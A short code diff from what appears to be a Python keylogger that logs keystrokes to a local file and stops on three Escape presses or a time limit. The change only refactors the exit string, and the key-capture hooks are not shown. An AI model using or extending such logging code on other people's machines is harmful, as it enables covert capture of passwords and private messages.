@@ -26,14 +26,13 @@ with open("keylog.txt","r+" if os.path.exists("keylog.txt") else "w+") as f:
         pythoncom.PumpWaitingMessages()
         t1 = time.time()
 
-        if "EscapeEscapeEscape" in string or (maxTime is not None and int((t1-t0)/60) >= maxTime):
+        if "Escape"*3 in string or (maxTime is not None and int((t1-t0)/60) >= maxTime):
             break
 
         if not int((t1-t0)/60) % 2 and int((t1-t0)/60):
             f.write(f.read()+string)
             string = ""
         
-    f.write(f.read()+string.strip("EscapeEscapeEscape"))
+    f.write(f.read()+string.strip("Escape"*3))
     f.close()
     sys.exit()
-    
